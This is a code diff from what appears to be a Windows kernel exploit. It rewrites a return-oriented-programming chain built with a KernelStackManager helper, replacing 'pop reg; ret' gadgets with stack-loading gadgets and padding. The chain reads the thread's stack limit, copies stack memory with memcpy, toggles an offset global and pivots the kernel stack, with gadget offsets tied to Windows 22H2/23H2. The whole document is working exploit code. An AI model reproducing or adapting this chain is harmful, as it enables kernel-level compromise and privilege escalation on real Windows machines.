@@ -60,13 +60,17 @@ int main()
 
     // setup ropchain for our main loop
     KernelStackManager.AddFunctionCall("PsGetCurrentThread");
-    KernelStackManager.AddGadget(0x24cd7b, "pop rcx; ret;");
+    KernelStackManager.AddGadget(0xbac760, "mov rcx, qword ptr \[rsp \+ 8\]; mov rdx, qword ptr \[rsp \+ 0x10\]; add rsp, 0x20; ret;");
+    KernelStackManager.AddPadding(0x8);
     KernelStackManager.AddValue(0x30, "stack limit");
+    KernelStackManager.AddPadding(0x10);
     KernelStackManager.AddGadget(0x263f08, "add rax, rcx; ret;");
 
     // rdx = stack limit store address
-    KernelStackManager.AddGadget(0x480032, "pop rdx; ret;");
+    KernelStackManager.AddGadget(0xbac765, "mov rdx, qword ptr \[rsp \+ 0x10\]; add rsp, 0x20; ret;");
+    KernelStackManager.AddPadding(0x10);
     KernelStackManager.AddValue((std::uint64_t)StackLimitStoreAddress, "stack limit store address");
+    KernelStackManager.AddPadding(0x8);
 
     // dereference rax, so that rax = stack limit
     KernelStackManager.AddGadget(0x27af45, "mov rax, qword ptr [rax]; ret;");
@@ -77,12 +81,15 @@ int main()
     KernelStackManager.AddGadget(0x29cc0e, "push rax; pop rbx; ret;");
     // sets rax to either 'rax + 0x2000' or 'rax + 0x4000' depending on i % 2.
     // read the value of the current stack offset global variable
-    KernelStackManager.AddGadget(0x202547, "pop rax; ret;");
+    KernelStackManager.AddGadget(0xbac75b, "mov rax, qword ptr \[rsp\]; mov rcx, qword ptr \[rsp \+ 8\]; mov rdx, qword ptr \[rsp \+ 0x10\]; add rsp, 0x20; ret;");
     KernelStackManager.AddValue((std::uint64_t)CurrentStackOffsetAddress, "current stack offset addr");
+    KernelStackManager.AddPadding(0x18);
     KernelStackManager.AddGadget(0x27af45, "mov rax, qword ptr [rax]; ret;");
     // rcx=0
-    KernelStackManager.AddGadget(0x24cd7b, "pop rcx; ret;");
+    KernelStackManager.AddGadget(0xbac760, "mov rcx, qword ptr \[rsp \+ 8\]; mov rdx, qword ptr \[rsp \+ 0x10\]; add rsp, 0x20; ret;");
+    KernelStackManager.AddPadding(0x8);
     KernelStackManager.AddValue(0, "set rcx to 0");
+    KernelStackManager.AddPadding(0x10);
     // move eax into ecx so we store the offset in rcx (we don't need to use full 64bits because CurrentStackOffsetAddress
     // holds a small value, either 0x2000 or 0x4000 as an offset
     KernelStackManager.AddGadget(0x212fcb, "xchg ecx, eax; ret;");
@@ -102,23 +109,30 @@ int main()
 
     // this gadget can either write into r8 or rdx, depending on the window version, so we will set both
     // to a valid memory dummy pool so that it writes there.
-    KernelStackManager.AddGadget(0x480032, "pop rdx; ret;");
+    KernelStackManager.AddGadget(0xbac765, "mov rdx, qword ptr \[rsp \+ 0x10\]; add rsp, 0x20; ret;");
+    KernelStackManager.AddPadding(0x10);
     KernelStackManager.AddValue((uint64_t)DummyMemoryAllocation, "rdx = dummy pool allocation");
-    KernelStackManager.AddGadget(0x47f82d, "pop r8; ret;");
+    KernelStackManager.AddPadding(0x8);
+    KernelStackManager.AddGadget(0xb7b925, "pop r8; add rsp, 0x20; pop rbx; ret;");
     KernelStackManager.AddValue((uint64_t)DummyMemoryAllocation, "r8 = dummy pool allocation");
+    KernelStackManager.AddPadding(0x28);
     KernelStackManager.AddGadget(0xa9b72d, "mov rcx, r9; mov qword ptr \[[a-zA-Z0-9]{2,3}\], [a-zA-Z0-9]{2,3}; ret;");
 
-
-    KernelStackManager.AddGadget(0x480032, "pop rdx; ret;");
+    KernelStackManager.AddGadget(0xbac765, "mov rdx, qword ptr \[rsp \+ 0x10\]; add rsp, 0x20; ret;");
+    KernelStackManager.AddPadding(0x10);
     KernelStackManager.AddValue((std::uint64_t)OriginalStackAllocation, "src address");
-    KernelStackManager.AddGadget(0x47f82d, "pop r8; ret;");
+    KernelStackManager.AddPadding(0x8);
+    KernelStackManager.AddGadget(0xb7b925, "pop r8; add rsp, 0x20; pop rbx; ret;");
     KernelStackManager.AddValue(0x2000, "count value");
+    KernelStackManager.AddPadding(0x28);
     KernelStackManager.AddFunctionCall("memcpy");
 
     // Grab stack limit
     KernelStackManager.AddFunctionCall("PsGetCurrentThread");
-    KernelStackManager.AddGadget(0x24cd7b, "pop rcx; ret;");
+    KernelStackManager.AddGadget(0xbac760, "mov rcx, qword ptr \[rsp \+ 8\]; mov rdx, qword ptr \[rsp \+ 0x10\]; add rsp, 0x20; ret;");
+    KernelStackManager.AddPadding(0x8);
     KernelStackManager.AddValue(0x30, "stack limit");
+    KernelStackManager.AddPadding(0x10);
     KernelStackManager.AddGadget(0x263f08, "add rax, rcx; ret;");
     // dereference rax, so that rax = stack limit
     KernelStackManager.AddGadget(0x27af45, "mov rax, qword ptr [rax]; ret;");
@@ -128,11 +142,14 @@ int main()
     // same code as above - basically just get the value of CurrentStackOffsetAddress
     // and add it to rax. so rax = stacklimit + curr_stack_offset
     KernelStackManager.AddGadget(0x29cc0e, "push rax; pop rbx; ret;");
-    KernelStackManager.AddGadget(0x202547, "pop rax; ret;");
+    KernelStackManager.AddGadget(0xbac75b, "mov rax, qword ptr \[rsp\]; mov rcx, qword ptr \[rsp \+ 8\]; mov rdx, qword ptr \[rsp \+ 0x10\]; add rsp, 0x20; ret;");
     KernelStackManager.AddValue((std::uint64_t)CurrentStackOffsetAddress, "current stack offset addr");
+    KernelStackManager.AddPadding(0x18);
     KernelStackManager.AddGadget(0x27af45, "mov rax, qword ptr [rax]; ret;");
-    KernelStackManager.AddGadget(0x24cd7b, "pop rcx; ret;");
+    KernelStackManager.AddGadget(0xbac760, "mov rcx, qword ptr \[rsp \+ 8\]; mov rdx, qword ptr \[rsp \+ 0x10\]; add rsp, 0x20; ret;");
+    KernelStackManager.AddPadding(0x8);
     KernelStackManager.AddValue(0, "set rcx to 0");
+    KernelStackManager.AddPadding(0x10);
     KernelStackManager.AddGadget(0x212fcb, "xchg ecx, eax; ret;");
     KernelStackManager.AddGadget(0x56f5f2, "push rbx; pop rax; add rsp, 0x20; pop rbx; ret;");
     KernelStackManager.AddPadding(0x20 + 0x8);
@@ -142,20 +159,26 @@ int main()
     KernelStackManager.AddGadget(0x2f3286, "mov r9, rax; mov rax, r9; (add rsp, 0x28; )?ret;");
     if (WindowsBuild == "22H2" || WindowsBuild == "23H2")
         KernelStackManager.AddPadding(0x28);
-    KernelStackManager.AddGadget(0x480032, "pop rdx; ret;");
+    KernelStackManager.AddGadget(0xbac765, "mov rdx, qword ptr \[rsp \+ 0x10\]; add rsp, 0x20; ret;");
+    KernelStackManager.AddPadding(0x10);
     KernelStackManager.AddValue((uint64_t)DummyMemoryAllocation, "rdx = dummy pool allocation");
-    KernelStackManager.AddGadget(0x47f82d, "pop r8; ret;");
+    KernelStackManager.AddPadding(0x8);
+    KernelStackManager.AddGadget(0xb7b925, "pop r8; add rsp, 0x20; pop rbx; ret;");
     KernelStackManager.AddValue((uint64_t)DummyMemoryAllocation, "r8 = dummy pool allocation");
+    KernelStackManager.AddPadding(0x28);
     KernelStackManager.AddGadget(0xa9b72d, "mov rcx, r9; mov qword ptr \[[a-zA-Z0-9]{2,3}\], [a-zA-Z0-9]{2,3}; ret;");
     // r11=rcx
     KernelStackManager.AddGadget(0xb4096a, "mov r11, rcx; mov r9d, edx; cmp edx, dword ptr [rax]; je 0x......; mov eax, 0xc000000d; ret;");
 
     // xor the current stack offset by global by 0x6000 (0x2000 ^ 0x4000 = 0x6000),
     // meaning we will always swap between 0x2000 and 0x4000 per iteration.
-    KernelStackManager.AddGadget(0x202547, "pop rax; ret;");
+    KernelStackManager.AddGadget(0xbac75b, "mov rax, qword ptr \[rsp\]; mov rcx, qword ptr \[rsp \+ 8\]; mov rdx, qword ptr \[rsp \+ 0x10\]; add rsp, 0x20; ret;");
     KernelStackManager.AddValue(0x6000, "xor key (0x6000)");
-    KernelStackManager.AddGadget(0x480032, "pop rdx; ret;");
+    KernelStackManager.AddPadding(0x18);
+    KernelStackManager.AddGadget(0xbac765, "mov rdx, qword ptr \[rsp \+ 0x10\]; add rsp, 0x20; ret;");
+    KernelStackManager.AddPadding(0x10);
     KernelStackManager.AddValue((std::uint64_t)CurrentStackOffsetAddress, "current stack offset addr (to xor)");
+    KernelStackManager.AddPadding(0x8);
     KernelStackManager.AddGadget(0x43d5e8, "xor qword ptr [rdx], rax; ret;");
 
     // perform pivot, rsp=r11
